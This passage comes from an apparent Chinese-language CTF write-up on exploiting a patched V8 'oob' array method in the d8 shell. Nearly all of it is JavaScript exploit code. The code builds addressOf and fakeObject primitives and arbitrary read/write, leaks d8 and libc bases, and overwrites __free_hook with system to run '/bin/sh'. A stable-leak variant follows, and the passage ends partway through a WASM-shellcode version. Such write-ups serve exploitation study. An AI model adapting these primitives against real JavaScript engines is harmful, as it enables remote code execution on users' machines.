class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">yhellow</span>:<span class="string">&quot;yhellow&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> floatArray = [<span class="number">1.11</span>, <span class="number">2.22</span>, <span class="number">3.33</span>];</span><br><span class="line"><span class="keyword">var</span> objArray = [obj];</span><br><span class="line"><span class="keyword">var</span> mapFloatArray = floatArray.oob();</span><br><span class="line"><span class="keyword">var</span> mapObjArray = objArray.oob();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">target</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    objArray[<span class="number">0</span>] = target;          </span><br><span class="line">    objArray.oob(mapFloatArray);    </span><br><span class="line">                                   </span><br><span class="line">    <span class="keyword">let</span> ret = objArray[<span class="number">0</span>];          </span><br><span class="line">    objArray.oob(mapObjArray);      </span><br><span class="line">    <span class="keyword">return</span> f2i(ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">target</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = target;        </span><br><span class="line">    floatArray.oob(mapObjArray);    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> ret = floatArray[<span class="number">0</span>];</span><br><span class="line">    floatArray.oob(mapFloatArray);  </span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buffer);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = x;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = x;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + x.toString(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> floatArrayAddr = addressOf(floatArray);</span><br><span class="line"><span class="keyword">var</span> floatArrayElement = floatArrayAddr - <span class="number">0x28n</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; distance 0x03d9b124ecc1 0x3d9b124ece9</span></span><br><span class="line"><span class="comment">0x3d9b124ecc1-&gt;0x3d9b124ece9 is 0x28 bytes (0x5 words)</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="keyword">var</span> fakeArrayAddr = floatArrayElement + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">var</span> fakeArray = fakeObject(i2f(fakeArrayAddr));</span><br><span class="line">floatArray[<span class="number">0</span>] = mapFloatArray;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RAA</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> +<span class="number">0x1n</span>); </span><br><span class="line">    <span class="keyword">let</span> data = fakeArray[<span class="number">0</span>];     </span><br><span class="line">    <span class="keyword">return</span> f2i(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dataBuf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> dataView = <span class="keyword">new</span> <span class="built_in">DataView</span>(dataBuf);</span><br><span class="line"><span class="keyword">var</span> bufBackStore = addressOf(dataBuf) + <span class="number">0x20n</span> -<span class="number">0x1n</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WAA</span>(<span class="params">addr, value</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>); </span><br><span class="line">    fakeArray[<span class="number">0</span>] = i2f(value);   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WAADataview</span>(<span class="params">addr, value</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WAA(bufBackStore, addr);</span><br><span class="line">    dataView.setFloat64(<span class="number">0</span>, i2f(value), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> code = RAA(addressOf(floatArray.constructor)-<span class="number">0x1n</span>+<span class="number">0x30n</span>); </span><br><span class="line"><span class="keyword">var</span> leak_addr = RAA(code-<span class="number">0x1n</span>+<span class="number">0x40n</span>) &gt;&gt; <span class="number">16n</span>; </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; distance 0x556d00f65780 0x556cfff9d000</span></span><br><span class="line"><span class="comment">0x556d00f65780-&gt;0x556cfff9d000 is -0xfc8780 bytes (-0x1f90f0 words)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> pro_base = leak_addr - <span class="number">0xfc8780n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] leak_addr : &quot;</span> + hex(leak_addr));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] d8 base : &quot;</span> + hex(pro_base));</span><br><span class="line"><span class="keyword">var</span> libc_start_main_got = pro_base + <span class="number">0x12a47b0n</span>;</span><br><span class="line"><span class="keyword">var</span> libc_start_main = RAA(libc_start_main_got);</span><br><span class="line"><span class="keyword">var</span> libc_base = libc_start_main - <span class="number">0x23f90n</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] __libc_start_main: &quot;</span> + hex(libc_start_main));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] libc base : &quot;</span> + hex(libc_base));</span><br><span class="line"><span class="keyword">var</span> free_hook = libc_base + <span class="number">0x1eee48n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] free_hook : &quot;</span> + hex(free_hook));</span><br><span class="line">system= libc_base + <span class="number">0x52290n</span>;</span><br><span class="line">WAADataview(free_hook, system);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwnYou</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//let cmd = &quot;gnome-calculator;&quot;;</span></span><br><span class="line">    <span class="keyword">let</span> cmd = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">pwnYou();   </span><br><span class="line"></span><br><span class="line">WAADataview(free_hook, <span class="number">0x0n</span>);  </span><br></pre></td></tr></table></figure>
<ul>
<li>稳定泄漏：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">yhellow</span>:<span class="string">&quot;yhellow&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> floatArray = [<span class="number">1.11</span>, <span class="number">2.22</span>, <span class="number">3.33</span>];</span><br><span class="line"><span class="keyword">var</span> objArray = [obj];</span><br><span class="line"><span class="keyword">var</span> mapFloatArray = floatArray.oob();</span><br><span class="line"><span class="keyword">var</span> mapObjArray = objArray.oob();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">target</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    objArray[<span class="number">0</span>] = target;          </span><br><span class="line">    objArray.oob(mapFloatArray);    </span><br><span class="line">                                   </span><br><span class="line">    <span class="keyword">let</span> ret = objArray[<span class="number">0</span>];          </span><br><span class="line">    objArray.oob(mapObjArray);      </span><br><span class="line">    <span class="keyword">return</span> f2i(ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">target</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = target;        </span><br><span class="line">    floatArray.oob(mapObjArray);    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> ret = floatArray[<span class="number">0</span>];</span><br><span class="line">    floatArray.oob(mapFloatArray);  </span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buffer);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = x;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = x;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + x.toString(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> floatArrayAddr = addressOf(floatArray);</span><br><span class="line"><span class="keyword">var</span> floatArrayElement = floatArrayAddr - <span class="number">0x28n</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; distance 0x03d9b124ecc1 0x3d9b124ece9</span></span><br><span class="line"><span class="comment">0x3d9b124ecc1-&gt;0x3d9b124ece9 is 0x28 bytes (0x5 words)</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="keyword">var</span> fakeArrayAddr = floatArrayElement + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">var</span> fakeArray = fakeObject(i2f(fakeArrayAddr));</span><br><span class="line">floatArray[<span class="number">0</span>] = mapFloatArray;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RAA</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> +<span class="number">0x1n</span>); </span><br><span class="line">    <span class="keyword">let</span> data = fakeArray[<span class="number">0</span>];     </span><br><span class="line">    <span class="keyword">return</span> f2i(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dataBuf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> dataView = <span class="keyword">new</span> <span class="built_in">DataView</span>(dataBuf);</span><br><span class="line"><span class="keyword">var</span> bufBackStore = addressOf(dataBuf) + <span class="number">0x20n</span> -<span class="number">0x1n</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WAA</span>(<span class="params">addr, value</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>); </span><br><span class="line">    fakeArray[<span class="number">0</span>] = i2f(value);   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WAADataview</span>(<span class="params">addr, value</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WAA(bufBackStore, addr);</span><br><span class="line">    dataView.setFloat64(<span class="number">0</span>, i2f(value), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> objAddr = addressOf(obj);</span><br><span class="line"><span class="keyword">var</span> searchBase = objAddr-<span class="number">0x8000n</span>-<span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> leak_addr = <span class="number">0xdeadbeefn</span>;</span><br><span class="line"><span class="keyword">var</span> pro_base = <span class="number">0xdeadbeefn</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> push_rbp = RAA(searchBase);</span><br><span class="line">    <span class="keyword">if</span>((push_rbp &amp; <span class="number">0xfffn</span>) == <span class="number">0x8b0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        60f:3078│  0x3553ea18a218 —▸ 0x55b0ea5048b0 ◂— push   rbp</span></span><br><span class="line"><span class="comment">        610:3080│  0x3553ea18a220 —▸ 0x2c5438080b71 ◂— 0x200002c54380801</span></span><br><span class="line"><span class="comment">        611:3088│  0x3553ea18a228 —▸ 0x55b0ea5048b0 ◂— push   rbp</span></span><br><span class="line"><span class="comment">        612:3090│  0x3553ea18a230 —▸ 0x17dca8789009 ◂— 0x700002c54380801</span></span><br><span class="line"><span class="comment">        */</span> </span><br><span class="line">        <span class="keyword">let</span> push_rbp2 = RAA(push_rbp);</span><br><span class="line">        <span class="keyword">if</span> (push_rbp2 == <span class="number">0x56415741e5894855n</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            pwndbg&gt; x/xg 0x55b0ea5048b0</span></span><br><span class="line"><span class="comment">            0x55b0ea5048b0 &lt;v8::(anonymous namespace)::WebAssemblyInstantiate(v8::FunctionCallbackInfo&lt;v8::Value&gt; const&amp;)&gt;:	0x56415741e5894855</span></span><br><span class="line"><span class="comment">            */</span> </span><br><span class="line">            leak_addr = push_rbp;</span><br><span class="line">            pro_base = leak_addr - <span class="number">0xe618b0n</span>;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            pwndbg&gt; distance 0x55b0e96a3000 0x55b0ea5048b0</span></span><br><span class="line"><span class="comment">            0x55b0e96a3000-&gt;0x55b0ea5048b0 is 0xe618b0 bytes (0x1cc316 words)</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="built_in">console</span>.log(hex(searchBase) + <span class="string">&quot; -&gt; &quot;</span> +hex(leak_addr));</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;[*] d8 base : &quot;</span> + hex(pro_base));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    searchBase += <span class="number">8n</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; telescope 0x12a47b0+0x5634968b1000</span></span><br><span class="line"><span class="comment">00:0000│  0x563497b557b0 —▸ 0x7f80d77a4f90 (__libc_start_main) ◂— endbr64 </span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="keyword">var</span> libc_start_main_got = pro_base + <span class="number">0x12a47b0n</span>;</span><br><span class="line"><span class="keyword">var</span> libc_start_main = RAA(libc_start_main_got);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] __libc_start_main : &quot;</span> + hex(libc_start_main));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; distance 0x7f80d77a4f90 0x7f80d7781000</span></span><br><span class="line"><span class="comment">0x7f80d77a4f90-&gt;0x7f80d7781000 is -0x23f90 bytes (-0x47f2 words)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> libc_base = libc_start_main - <span class="number">0x23f90n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] libc base : &quot;</span> + hex(libc_base));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; p &amp;__free_hook</span></span><br><span class="line"><span class="comment">$2 = (void (**)(void *, const void *)) 0x7f80d796fe48 &lt;__free_hook&gt;</span></span><br><span class="line"><span class="comment">pwndbg&gt; distance 0x7f80d796fe48 0x7f80d7781000</span></span><br><span class="line"><span class="comment">0x7f80d796fe48-&gt;0x7f80d7781000 is -0x1eee48 bytes (-0x3ddc9 words)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> free_hook = libc_base + <span class="number">0x1eee48n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] free_hook : &quot;</span> + hex(free_hook));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; p &amp;system</span></span><br><span class="line"><span class="comment">$3 = (int (*)(const char *)) 0x7f80d77d3290 &lt;__libc_system&gt;</span></span><br><span class="line"><span class="comment">pwndbg&gt; distance 0x7f80d77d3290 0x7f80d7781000</span></span><br><span class="line"><span class="comment">0x7f80d77d3290-&gt;0x7f80d7781000 is -0x52290 bytes (-0xa452 words)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">system = libc_base + <span class="number">0x52290n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] system : &quot;</span> + hex(system));</span><br><span class="line">WAADataview(free_hook, system); </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwnYou</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//let cmd = &quot;gnome-calculator;&quot;;</span></span><br><span class="line">    <span class="keyword">let</span> cmd = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">pwnYou();   </span><br><span class="line"></span><br><span class="line">WAADataview(free_hook, <span class="number">0x0n</span>);  </span><br></pre></td></tr></table></figure>
<ul>
<li>利用 WASM 执行 shellcode：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">yhellow</span>:<span class="string">&quot;yhellow&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> floatArray = [<span class="number">1.11</span>, <span class="number">2.22</span>, <span class="number">3.33</span>];</span><br><span class="line"><span class="keyword">var</span> objArray = [obj];</span><br><span class="line"><span class="keyword">var</span> mapFloatArray = floatArray.oob();</span><br><span class="line"><span class="keyword">var</span> mapObjArray = objArray.oob();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">target</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    objArray[<span class="number">0</span>] = target;          </span><br><span class="line">    objArray.oob(mapFloatArray);    </span><br><span class="line">                                   </span><br><span class="line">    <span class="keyword">let</span> ret = objArray[<span class="number">0</span>];          </span><br><span class="line">    objArray.oob(mapObjArray);      </span><br><span class="line">    <span class="keyword">return</span> f2i(ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">target</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = target;        </span><br><span class="line">    floatArray.oob(mapObjArray);    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> ret = floatArray[<span class="number">0</span>];</span><br><span class="line">    floatArray.oob(mapFloatArray);  </span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buffer);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = x;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = x;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + x.toString(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> floatArrayAddr = addressOf(floatArray);</span><br><span class="line"><span class="keyword">var</span> floatArrayElement = floatArrayAddr - <span class="number">0x28n</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; distance 0x03d9b124ecc1 0x3d9b124ece9</span></span><br><span class="line"><span class="comment">0x3d9b124ecc1-&gt;0x3d9b124ece9 is 0x28 bytes (0x5 words)</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="keyword">var</span> fakeArrayAddr = floatArrayElement + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">var</span> fakeArray = fakeObject(i2f(fakeArrayAddr));</span><br><span 